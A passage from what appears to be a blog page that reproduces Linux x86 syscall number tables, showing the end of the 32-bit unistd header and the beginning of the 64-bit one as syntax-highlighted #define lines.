class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatat64 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 328</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 329</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 330</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 331</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 332</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 334</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 336</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 340</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 343</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 344</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 345</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 346</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 347</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 348</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 349</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 351</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 352</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 353</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 354</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 355</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 356</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 357</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 358</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 359</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 360</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 361</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 362</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 363</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 364</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 365</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 366</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 367</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 368</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 369</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 370</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recfrom 371</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 372</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 373</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 374</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 375</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 376</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 377</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 378</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure>

<hr>
<h3><span id="64-位">64 位</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span 